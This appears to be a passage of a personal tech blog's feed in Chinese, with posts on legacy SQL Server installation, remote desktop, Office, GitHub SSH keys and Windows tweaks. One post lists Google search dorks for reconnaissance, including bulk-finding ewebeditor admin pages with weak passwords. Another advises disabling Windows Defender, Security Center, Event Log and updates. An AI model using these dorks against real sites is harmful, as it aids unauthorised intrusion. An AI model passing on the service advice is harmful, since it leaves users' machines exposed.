    <id>https://e1sewhere.github.io/2019/06/27/Win10安装-SQL-server-2000/</id>
    <published>2019-06-27T06:55:57.000Z</published>
    <updated>2019-08-13T12:09:24.367Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>由于需要在Win10上安装老旧的管理系统,尝试了在WIN10上安装SQL Server 2000.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">环境</span><br><span class="line">WIN10X64专业版</span><br><span class="line">SQL Server 2000个人版</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="确保之前的没有sqlserver安装残留"><a href="#确保之前的没有sqlserver安装残留" class="headerlink" title="确保之前的没有sqlserver安装残留"></a>确保之前的没有sqlserver安装残留</h1><p>之前的sqlserver没有卸载干净的话,很容易安装报错.确保之前的是删除干净的.</p><h1 id="替换sqlunirl-dll文件"><a href="#替换sqlunirl-dll文件" class="headerlink" title="替换sqlunirl.dll文件"></a>替换sqlunirl.dll文件</h1><p>将sql2000安装包下的<code>./x86/system/sqlunirl.dll</code>复制,粘贴到C盘的<code>./windows/syswow64/</code>下.<br>如果权限不足.进行一下步骤,没有则跳过下一项</p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>找到syswow64下的sqlunirl.dll文件→右键属性→安全→高级.<br>这时高级选项卡的<code>所有者</code>项目为<code>TrustedNstaller</code>,点击更改,在<code>输入要选择的对象名称</code>中输入当前用户名,通常如果是users用户组可以接输入<code>users</code>,点击检查名称,就会自动补全当前用户名→确定→确定<br>回到属性选项卡→常规→编辑,选择users用户组→<code>users的权限</code>勾选<code>允许:完全控制</code>(反正只是一个文件的操作权限,也可以只勾选修改权限)→确定</p><p>现在获得了操作权限,将<code>./syswow64/sqlunirl.dll</code>修改为<code>sqlunirl64.dll</code>作为备份,如果提示需要管理员权限一律选择允许,后面所有的步骤遇到管理员权限都选择允许.<br>然后重复最开始的复制操作.成功复制文件到系统下.</p><p>回到安装包,根目录下的<code>AUTORUN.exe</code>已经无法在64位下运行,直接运行setup程序.<br>进入安装包找到<code>./sqlserver2000/x86/setup/setupsql.exe</code>以管理员权限运行.<br>如果执行后提示有其他的安装正在执行之类的(记不到提示的什么了)可以尝试编辑注册表,没有则跳过下一项</p><h1 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h1><p>win+R运行<code>regedit</code>定位到<code>HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Session Manager</code>在右边找到<code>PendingFileRenameOperations</code>项目,直接删除.(路径纯手打可能有错误)</p><h1 id="正常安装"><a href="#正常安装" class="headerlink" title="正常安装"></a>正常安装</h1><p>之后的安装就是常规安装了.</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>管理系统需要用到的出了sqlserver2000还有驱动以及几个主程序,这两个程序的安装都是选择兼容模式位xp,然后管理员模式运行.<br>驱动的安装需要使用命令行添加<code>-i</code>参数,这里需要用管理员模式运行CMD,同时exe文件也需要在属性里添加管理员权限和xp兼容模式.<br>所有安装完成后.要正常运行管理系统需要三个程序</p><ul><li>TCP端口驱动程序</li><li>管理系统服务端</li><li>sqlserver服务端</li></ul><p>这三个程序在WIN10中设置了开机自启并不起作用.<br>把他们的快捷方式添加到<code>c:/users/你的名字/appdata/roamin/microsoft/windows/start menu/programs/startup/</code><br>文件夹下.这样开机就会自动启动了.</p><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><p>搜索其他资源的时候,看到这样一个帖子,站长似乎做了一个集成安装程序.由于是付费入群下载,看更新日志似乎还是相当靠谱,支持xp~win10.</p><p>地址:<a href="https://www.flighty.cn/html/soft/20140119_219.html" target="_blank" rel="noopener">微软SQL2000+SP4集成安装版 v3.5 BY 少轻狂</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于需要在Win10上安装老旧的管理系统,尝试了在WIN10上安装SQL Server 2000.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;环境&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WIN10X64专业版&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SQL Server 2000个人版&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="教程" scheme="https://e1sewhere.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="win10" scheme="https://e1sewhere.github.io/tags/win10/"/>
    
      <category term="sqlserver" scheme="https://e1sewhere.github.io/tags/sqlserver/"/>
    
  </entry>
  
  <entry>
    <title>RD Client 简明教程</title>
    <link href="https://e1sewhere.github.io/2019/05/23/RD-Client-%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"/>
    <id>https://e1sewhere.github.io/2019/05/23/RD-Client-简明教程/</id>
    <published>2019-05-23T06:02:45.000Z</published>
    <updated>2019-05-23T06:51:17.484Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>最近学习中有手机远程控制的需求,体验勉勉强强吧.不过使用RD Client的时候居然还折腾了那么久…果然现在学习能力下降的有点剧烈.<br><a id="more"></a></p><p>只用于内网连接,公网没有这个需求,但是连接步骤都是一样的.<br>软件使用很简单,就是傻瓜式的下一步下一步…多数人失败都是没有达到使用要求</p><h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><ul><li>操作系统有相关组件(专业版,企业版)</li><li>开启了远程桌面</li><li>IP正确(或者内网设备名称正确)</li><li>账户正确,账户拥有权限</li></ul><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><p>家庭版似乎需要怎么折腾一下自己搜索吧,既然都玩win了反正都是白嫖,装机还是装专业企业版吧.</p><p><code>这台电脑</code> -&gt; <code>属性</code> -&gt; <code>远程设置</code> -&gt; <code>允许连接到此计算机</code> -&gt; <code>仅允许运行使用网络级别身份验证的远程桌面的计算机连接（建议）</code><br>既然都开启了远程桌面,远程协助也一块开了吧,反正也没有安全需求.</p><p><img src="https://e1sewhere.github.io/images/170.png" alt=""></p><p>这个界面也可以添加新的可连接账户,默认当前用户是有连接权限的</p><h2 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h2><p>你登陆windows时显示的名称有可能并不是当前账户的名称(除非是域账户)</p><p>cmd使用<code>whoami</code>命令可以查看当前用户名称,比如我现在的账户名称就是这个163邮箱</p><p><img src="https://e1sewhere.github.io/images/172.png" alt=""></p><h2 id="移动端app连接"><a href="#移动端app连接" class="headerlink" title="移动端app连接"></a>移动端app连接</h2><p>打开软件<br>右上角加号 -&gt; Desktop</p><p>这里如果是同一局域网下，可以直接scan你的设备名称，如果没扫出来，多扫以下就好了。实在扫不出来</p><p>pc上 cmd 执行 <code>ipconfig</code>命令查看下自己的局域网ip 然后移动端 手动输入ip</p><p><img src="https://e1sewhere.github.io/images/desktopscan.png" alt=""></p><p>上面添加了pc name后,添加user name  点击user name的下拉框 -&gt; add user account</p><p><img src="https://e1sewhere.github.io/images/addcount.png" alt=""></p><p>账户密码来一套, 确定后,右上角 林克斯大特~! (connect)</p><p>正常的话就连接了.</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>使用RD Client远程桌面,有时候分辨率会出问题,比如有些全屏游戏无法全屏,但是切换到pc就好了.</li><li>RD Client 似乎不能多账户运行,运行其他账户当前pc就会提示你注销.</li><li>如果想使用手机当分屏我建议使用<code>spacedesk</code>,体验还不错<br><img src="https://e1sewhere.github.io/images/173.png" alt=""></li></ul><div><h1>RECOMMEND</h1><ul><li><a href="https://e1sewhere.github.io/2018/10/27/Win下批量-关闭-打开-进程/">Win下批量 关闭/打开 进程</a></li><li><a href="https://e1sewhere.github.io/2018/10/15/Windows-To-Go系统安装记录/">Windows To Go系统安装记录</a></li><li><a href="https://e1sewhere.github.io/2018/09/02/Win磁盘MBR转换为GUID/">Win磁盘MBR转换为GUID</a></li><li><a href="http://broken-year.github.io/2022/03/24/back-door/">系统后门</a></li></ul></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近学习中有手机远程控制的需求,体验勉勉强强吧.不过使用RD Client的时候居然还折腾了那么久…果然现在学习能力下降的有点剧烈.&lt;br&gt;
    
    </summary>
    
      <category term="教程" scheme="https://e1sewhere.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="windows" scheme="https://e1sewhere.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Office 使用遇到的问题</title>
    <link href="https://e1sewhere.github.io/2019/05/11/office-%E4%BD%BF%E7%94%A8%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>https://e1sewhere.github.io/2019/05/11/office-使用遇到的问题/</id>
    <published>2019-05-11T10:00:22.000Z</published>
    <updated>2019-06-04T08:01:08.330Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>这是在使用office过程中遇到问题,使用的一些解决方法的记录<br><a id="more"></a></p><h1 id="Word"><a href="#Word" class="headerlink" title="Word"></a>Word</h1><h2 id="自动生成目录-部分标题没有前导符"><a href="#自动生成目录-部分标题没有前导符" class="headerlink" title="自动生成目录,部分标题没有前导符"></a>自动生成目录,部分标题没有前导符</h2><p>如图<br><img src="https://e1sewhere.github.io/images/168.png" alt=""></p><p>在标题和页码之间输入Tab即可,如果没有成功,选中这一行右键 段落 制表位 ,其中前导符选中我们需要的那个,然后确定,重新插入Tab.</p><h2 id="正文页码从1开始"><a href="#正文页码从1开始" class="headerlink" title="正文页码从1开始"></a>正文页码从1开始</h2><p>把光标停在正文这一页的内容前面,然后选择 面布局–分隔符–分节符–下一页 </p><p>点击视图–页眉和页脚–插入页码</p><p>在设计中选择设置页码格式,起始页为1</p><p>选中正文的第一页的页脚,取消与上一节的链接</p><p>查看正文第一页页脚变为1</p><p>如果目录首页等还有页码,删除即可</p><h1 id="PowerPoint"><a href="#PowerPoint" class="headerlink" title="PowerPoint"></a>PowerPoint</h1><h2 id="提取背景图片"><a href="#提取背景图片" class="headerlink" title="提取背景图片"></a>提取背景图片</h2><p>将文件扩展名<code>ppt</code>或者<code>pptx</code>修改为<code>zip</code>然后解压缩,可以在解压后的文件里找到背景图,背景图位于<code>media</code>文件夹内.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是在使用office过程中遇到问题,使用的一些解决方法的记录&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://e1sewhere.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="office" scheme="https://e1sewhere.github.io/tags/office/"/>
    
      <category term="word" scheme="https://e1sewhere.github.io/tags/word/"/>
    
      <category term="ppt" scheme="https://e1sewhere.github.io/tags/ppt/"/>
    
      <category term="excel" scheme="https://e1sewhere.github.io/tags/excel/"/>
    
  </entry>
  
  <entry>
    <title>google hack 笔记</title>
    <link href="https://e1sewhere.github.io/2019/03/29/google-hack-%E7%AC%94%E8%AE%B0/"/>
    <id>https://e1sewhere.github.io/2019/03/29/google-hack-笔记/</id>
    <published>2019-03-29T07:30:55.000Z</published>
    <updated>2019-03-29T08:08:33.806Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>关于google hack得笔记 从有道笔记转移<br><a id="more"></a></p><h1 id="基础关键字组合"><a href="#基础关键字组合" class="headerlink" title="基础关键字组合"></a>基础关键字组合</h1><ul><li><code>&quot;&quot;</code> 完全匹配(严格),双引号内的字符串不拆分.</li><li><code>+</code> 指定一个一定存在的关键词</li><li><code>-</code> 指定一个一定不存在的关键词</li><li><code>|</code> 或,满足其中一个关键词就可以.</li><li><code>AND</code> 所有关键词都必须满足(可以不像双引号一样必须连在一起)</li></ul><h1 id="Site"><a href="#Site" class="headerlink" title="Site:"></a>Site:</h1><p>搜索指定域名下的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:domain</span><br><span class="line"></span><br><span class="line">site:baidu.com</span><br></pre></td></tr></table></figure><h1 id="inurl"><a href="#inurl" class="headerlink" title="inurl:"></a>inurl:</h1><p>搜索结果的url中一定有指定的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inurl:str</span><br><span class="line"></span><br><span class="line">inurl:admin/login.php</span><br></pre></td></tr></table></figure><h1 id="intitle"><a href="#intitle" class="headerlink" title="intitle:"></a>intitle:</h1><p>搜索标题为指定内容的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intitle:str</span><br><span class="line"></span><br><span class="line">intitle:后台管理</span><br></pre></td></tr></table></figure><h1 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h1><p>缓存搜索,类似百度的快照可以可以搜索到google记录的网页历史快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cache:url</span><br></pre></td></tr></table></figure><h1 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h1><p>这个语法都可以自由自合<br>比如<br>搜索site为baidu.com 包含”有限公司”的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com &quot;有限公司&quot;</span><br></pre></td></tr></table></figure><p>搜索site为baidu.com 标题中包含”有限公司”的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com intitle:有限公司</span><br></pre></td></tr></table></figure><h1 id="实用搜例子"><a href="#实用搜例子" class="headerlink" title="实用搜例子"></a>实用搜例子</h1><ul><li>查找目标管理员<br><code>site:domain &quot;发布人&quot;</code><br>可以再网站中搜索<code>发布人</code>这个关键字,后面跟随的信息就是网站发布小心的用户,而这个用户很可能就是管理员</li><li>查找目标脚本语言<br><code>site:domain php</code><br>可以在网站中搜索类似<code>php</code>这样的脚本语言扩展名,对于某些伪静态网站(比如页面全是html的),如果搜到某种扩展名基本可以判断这个网站使用的脚本语言.</li><li>查找弱点站<br><code>inurl:ewebeditor admin</code><br>可以用来批量查找存在某些弱点的站点.比如上面这个就是查找ewbeditor编辑器的后台页面,这种后台通常存在弱口令.</li><li>寻找c段主机<br><code>site:49.122.21.*</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于google hack得笔记 从有道笔记转移&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://e1sewhere.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>获取MySQL执行的语句</title>
    <link href="https://e1sewhere.github.io/2019/03/18/%E8%8E%B7%E5%8F%96MySQL%E6%89%A7%E8%A1%8C%E7%9A%84%E8%AF%AD%E5%8F%A5/"/>
    <id>https://e1sewhere.github.io/2019/03/18/获取MySQL执行的语句/</id>
    <published>2019-03-18T03:23:41.000Z</published>
    <updated>2019-03-20T10:22:18.559Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>windows下利用log监控本地运行的mysql服务所执行的语句<br><a id="more"></a></p><p>直接在mysql根目录下的<code>my.ini</code>中配置</p><p>在<code>[mysqld]</code>下添加一行<code>log</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log = &quot;C:\Users\Doll SY DA\Desktop\mysqllog\mysql_log.sql&quot;</span><br></pre></td></tr></table></figure><p>重启mysql服务<br>这样,本地执行的语句都会在这个文件中找到了.</p><p>为了更加方便我们使用工具:<a href="https://github.com/virink/vMysqlMonitoring/releases/tag/v2.0" target="_blank" rel="noopener">vMysqlMonitoring</a><br>打上断点,点击获取就可以刷新一次日志.</p><div><h1>RECOMMEND</h1><ul><li><a href="http://broken-year.github.io/2022/03/22/php-sql/">php和数据库</a></li></ul></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;windows下利用log监控本地运行的mysql服务所执行的语句&lt;br&gt;
    
    </summary>
    
      <category term="解决方法" scheme="https://e1sewhere.github.io/categories/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
    
      <category term="mysql" scheme="https://e1sewhere.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>GitHub使用技巧</title>
    <link href="https://e1sewhere.github.io/2019/02/24/GitHub%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://e1sewhere.github.io/2019/02/24/GitHub使用技巧/</id>
    <published>2019-02-24T02:29:22.000Z</published>
    <updated>2019-11-02T06:48:46.765Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>本文记录了github使用中发现的好的用法.以及遇到的问题解决的过程<br><a id="more"></a></p><h1 id="使用GiThub直接访问html文件"><a href="#使用GiThub直接访问html文件" class="headerlink" title="使用GiThub直接访问html文件"></a>使用GiThub直接访问html文件</h1><p>我们先上传文件(这个很简单不再叙述)<br>然后进入我们需要访问的预览管理页面<br><img src="https://e1sewhere.github.io/images/013.png" alt=""></p><p>直接在这个页面的url前添加<code>htmlpreview.github.io/?</code>访问,就可以访问我们的html了.<br><img src="https://e1sewhere.github.io/images/014.png" alt=""></p><h1 id="一台设备绑定两个Git账号"><a href="#一台设备绑定两个Git账号" class="headerlink" title="一台设备绑定两个Git账号"></a>一台设备绑定两个Git账号</h1><p>本条参考:</p><blockquote><p><a href="https://www.jianshu.com/p/3fc93c16ad2d" target="_blank" rel="noopener">https://www.jianshu.com/p/3fc93c16ad2d</a><br><a href="https://blog.csdn.net/jifaliwo123/article/details/79126785" target="_blank" rel="noopener">https://blog.csdn.net/jifaliwo123/article/details/79126785</a></p></blockquote><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li>本机两个密钥对</li><li>push时每个仓库使用独立账户</li></ul><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol><li>查看密钥 <code>ls ~/.ssh/</code> ,看到 <code>id_rsa</code> 与 <code>id_rsa_pub</code> 则说明已经有一对密钥.</li><li>生成新的公钥<code>ssh-keygen -t rsa -f ~/.ssh/id_rsa_2 -C &quot;yourmail@xxx.com&quot;</code>,我按照默认命名指派名称为<code>id_rsa_2</code>,也可以取一个有意义的名称.询问密码设置我直接为空(回车两下).</li><li>再次用ls查询,和上一次比较多出了<code>id_rsa_2</code> 与 <code>id_rsa_pub_2</code>,密钥成功创建了.</li><li>在<code>.ssh</code>文件夹下新建config文件(无扩展名)添加内容,另不同 Host 实际映射到同一 HostName，但密钥文件不同.Host 前缀可自定义，例子中ieit</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># default                                                                       </span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"># two                                                                           </span><br><span class="line">Host ieit.github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_2</span><br></pre></td></tr></table></figure><ol start="5"><li>将公钥内容添加到GitHub上,参考:<a href="https://link.jianshu.com/?t=http://www.xuanfengge.com/using-ssh-key-link-github-photo-tour.html" target="_blank" rel="noopener">使用SSH密钥连接Github【图文教程】</a></li><li>测试 ssh 链接</li></ol><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@ieit.github.com</span><br><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment"># Hi IEIT! You've successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="comment"># 出现上边这句，表示链接成功</span></span><br></pre></td></tr></table></figure><ol start="7"><li>取消全局 用户名/邮箱设置，并进入项目文件夹单独设置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 取消全局 用户名/邮箱 配置</span><br><span class="line">git config –-global -–unset user.name</span><br><span class="line">git config –-global –-unset user.email</span><br><span class="line"># 单独设置每个repo 用户名/邮箱</span><br><span class="line">git inti</span><br><span class="line">git config user.email “xxxx@xx.com”</span><br><span class="line">git config user.name “xxxx”</span><br></pre></td></tr></table></figure><p>添加账户后无法<code>ssh -T git@github.com</code>成攻击,但原来的哪个配置好的账户是直接push是可以的,新建的密钥账户就无法push.弄了很久没解决,加之这里网络有问题,挂了代理也有毛病,遂放弃.以后有时间了再来看看.暂时先用虚拟机代替.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文记录了github使用中发现的好的用法.以及遇到的问题解决的过程&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://e1sewhere.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="github" scheme="https://e1sewhere.github.io/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>Win 优化&amp;技巧以及其他</title>
    <link href="https://e1sewhere.github.io/2019/02/20/Win-%E4%BC%98%E5%8C%96&amp;%E6%8A%80%E5%B7%A7%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96/"/>
    <id>https://e1sewhere.github.io/2019/02/20/Win-优化&amp;技巧以及其他/</id>
    <published>2019-02-20T02:10:30.000Z</published>
    <updated>2019-09-13T04:27:45.414Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>本文针对<code>Windows</code>,主要是针对平常使用时,不得不做的一些小设置做一个记录.至于通用优化,以后有时间会参考别人的帖子,做一些精简整理.</p><a id="more"></a><h1 id="WIN10"><a href="#WIN10" class="headerlink" title="WIN10"></a>WIN10</h1><h2 id="通用优化"><a href="#通用优化" class="headerlink" title="通用优化"></a>通用优化</h2><h3 id="关闭系统服务"><a href="#关闭系统服务" class="headerlink" title="关闭系统服务"></a>关闭系统服务</h3><p>以下服务都可以关闭(未整理完全):</p><blockquote><p>Windows search<br>Windows Error Reporting Service<br>Background Intelligent Transfer Service<br>HomeGroup Listener<br>HomeGroup Provider<br>windows update<br>Windows Event Log<br>Superfetch<br>Windows Defender Service<br>Security Center<br>Shell Hardware Detection</p></blockquote><h3 id="关闭磁盘整理"><a href="#关闭磁盘整理" class="headerlink" title="关闭磁盘整理"></a>关闭磁盘整理</h3><p>自动磁盘整理会拖慢系统速度,而且如果是非机械硬盘磁盘整理只能消耗磁盘寿命.如果需要整理手动就好</p><ol><li>对着需要关闭的磁盘右键属性</li><li><code>工具</code>-&gt;<code>优化</code>-&gt;<code>关闭</code>自动优化</li></ol><h2 id="琐碎设置"><a href="#琐碎设置" class="headerlink" title="琐碎设置"></a>琐碎设置</h2><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><p>简单的本地屏蔽一些域名，或者为某些无法访问的域名指定固定的ip。</p><h4 id="hosts文件位置"><a href="#hosts文件位置" class="headerlink" title="hosts文件位置"></a>hosts文件位置</h4><p><code>C:\Windows\System32\drivers\etc\hosts</code><br>hosts文件是没有后缀的，由于是只读文件，且必须管理员权限修改，可以在安全中将赋予当前用户的修改权限，然后文件取消只读属性，就可以修改了。</p><h4 id="Hosts文件立即生效"><a href="#Hosts文件立即生效" class="headerlink" title="Hosts文件立即生效"></a>Hosts文件立即生效</h4><p>win不像linux修改后立即生效，通常需要下刷新dns缓存，cmd下使用命令</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /flushdns</span><br></pre></td></tr></table></figure><h3 id="Win10-广告弹窗解决方案"><a href="#Win10-广告弹窗解决方案" class="headerlink" title="Win10 广告弹窗解决方案"></a>Win10 广告弹窗解决方案</h3><p>使用火绒弹窗拦截临时解决弹窗问题,可以让弹窗降低,包括窗口弹窗,右下角弹窗.</p><p>这里只使用火绒杀毒软件的附带功能,本机测试关闭火绒杀毒的主程序,弹窗拦截插件依然是可以正常使用的.<br>火绒杀毒的一些优缺点:</p><blockquote><p>轻量,安静,但是杀毒几乎没有作用,还不如Win10自带的WD<br>类似360监控软件静默安装,一定程度防止流氓软件自动安装.<br>占用低,可以用来解决关闭WD后烦人的安全警告,WD可以将其识别为杀毒软件,所以主动关闭WD后,WD不会再有烦人的不安全警告.</p></blockquote><h4 id="获取弹窗拦截插件"><a href="#获取弹窗拦截插件" class="headerlink" title="获取弹窗拦截插件"></a>获取弹窗拦截插件</h4><p>论坛有单独提取插件程序,但是最简单的方法是使用火绒杀毒内置的下载器获得拦截程序.<br>从官网下载:<a href="https://www.huorong.cn/" target="_blank" rel="noopener">火绒安全软件主程序</a></p><p><img src="https://e1sewhere.github.io/images/206.png" alt=""><br>点击<code>扩展工具</code>→点击<code>弹窗拦截</code> 下载</p><h4 id="开启拦截"><a href="#开启拦截" class="headerlink" title="开启拦截"></a>开启拦截</h4><p>下载后打开弹窗拦截,点击<code>开启弹窗拦截</code><br><img src="https://e1sewhere.github.io/images/207.png" alt=""></p><h5 id="开启内置拦截规则库"><a href="#开启内置拦截规则库" class="headerlink" title="开启内置拦截规则库"></a>开启内置拦截规则库</h5><p>点击<code>添加拦截</code>→点击<code>建议拦截</code><br><img src="https://e1sewhere.github.io/images/208.png" alt=""></p><p>弹出新对话框,点击<code>一键拦截</code><br><img src="https://e1sewhere.github.io/images/209.png" alt=""></p><p>到此内置拦截库已经应用</p><h5 id="手动添加拦截规则"><a href="#手动添加拦截规则" class="headerlink" title="手动添加拦截规则"></a>手动添加拦截规则</h5><p>内置的拦截很不全面,需要每次弹窗后添加手动拦截,添加一次后这个弹窗就不会出现.基本按照这个方式用几天就能做到99%的拦截.<br>广告弹窗弹出的时候先不要关闭它.<br>在程序托盘位置右键弹窗拦截图标,点击手动拦截.(我这个任务栏托盘在右上角,正常情况应该是右下角)</p><p><img src="https://e1sewhere.github.io/images/212.png" alt=""></p><p>点击后鼠标在你需要拦截的弹窗上悬浮，确保黄色选框正确的框住了你需要拦截的弹窗，然后点击<code>点击拦截此窗口</code><br><img src="https://e1sewhere.github.io/images/214.png" alt=""></p><p>拦截方式选择关闭弹窗，点击<code>拦截弹窗</code><br><img src="https://e1sewhere.github.io/images/216.png" alt=""></p><p>这样弹窗就被关闭了.</p><h4 id="关闭错误的拦截"><a href="#关闭错误的拦截" class="headerlink" title="关闭错误的拦截"></a>关闭错误的拦截</h4><p><em>如果不小心拦截了正常的窗口可以使用使用这个方法撤回拦截</em><br>我们双击托盘上的弹窗拦截图标打开弹窗拦截主界面.<br>主界面的列表可以看到已被拦截的弹窗程序.<br><img src="https://e1sewhere.github.io/images/217.png" alt=""></p><p>刚才测试拦截的程序是正常软件,不是弹窗程序.所以我们要取消拦截.直接点击红色叉删除即可.<br><img src="https://e1sewhere.github.io/images/218.png" alt=""></p><h4 id="其他注意的"><a href="#其他注意的" class="headerlink" title="其他注意的"></a>其他注意的</h4><h5 id="软件设置"><a href="#软件设置" class="headerlink" title="软件设置"></a>软件设置</h5><p>一定要保证弹窗拦截程序开机自启.<br>打开设置<br><img src="https://e1sewhere.github.io/images/210.png" alt=""></p><p>设置项目如下:<br><img src="https://e1sewhere.github.io/images/211.png" alt=""></p><h3 id="快捷方式添加到开始菜单"><a href="#快捷方式添加到开始菜单" class="headerlink" title="快捷方式添加到开始菜单"></a>快捷方式添加到开始菜单</h3><p>将需要的快捷方式移动到路径<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs</code><br>然后就可以在开始菜单的列表里看到了,之后手动固定到磁铁即可.</p><h3 id="关闭任务栏窗口预览"><a href="#关闭任务栏窗口预览" class="headerlink" 